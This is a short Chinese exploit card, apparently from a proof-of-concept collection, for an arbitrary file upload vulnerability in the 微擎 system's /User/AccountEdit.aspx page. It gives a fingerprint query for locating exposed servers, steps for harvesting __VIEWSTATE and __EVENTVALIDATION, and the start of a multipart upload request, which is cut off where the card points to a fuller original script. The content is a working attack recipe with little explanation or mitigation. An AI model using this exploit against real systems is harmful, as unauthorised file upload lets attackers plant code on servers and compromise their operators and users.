# 微擎系统-AccountEdit任意文件上传漏洞

- **系统**：微擎系统-AccountEdit　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Widgets/WidgetCollection/"`
- **请求**：`POST /User/AccountEdit.aspx HTTP/1.1`

**请求体 / payload**
```
前端方式：
1、访问/User/AccountEdit.aspx，会有一个上传点，可手动上传文件
发包方式：
1、访问/User/AccountEdit.aspx，查看源代码，搜索__VIEWSTATE" value=" 和__EVENTVALIDATION" value="这两个字符串，记录下来
2、发包上传文件：
Host:
Content-Type: multipart/form-data;boundary=---------------------------8448979704593935221298734076
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="__VIEWSTATE"
{VIEWSTATE}
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="__EVENTVALIDATION"
{EVENTVALIDATION}
-----------------------------8448979704593935221298734076
Content-Disposition: fo…（脚本共 3331 字，完整版见原文）
```